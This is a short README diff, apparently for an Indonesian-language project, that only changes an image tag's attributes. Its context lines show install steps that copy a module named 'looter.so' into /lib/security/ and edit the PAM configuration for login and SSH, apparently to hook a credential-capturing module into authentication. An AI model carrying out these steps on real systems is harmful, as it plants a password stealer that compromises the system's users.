@@ -36,7 +36,7 @@ sudo cp looter.so /lib/security/
 sudo nano /etc/pam.d/common-auth ( Ubuntu / Debian )
 sudo nano /etc/pam.d/sshd ( CentOS / RHEL / Alma / Rocky )
 
-<img width="729" height="628" alt="image" src="https://github.com/user-attachments/assets/ef713525-0818-4024-9fd0-19ca4efc2330" />
+<img src="https://github.com/user-attachments/assets/ef713525-0818-4024-9fd0-19ca4efc2330" width="700">
 
 
 # Tambahkan di bagian atas file
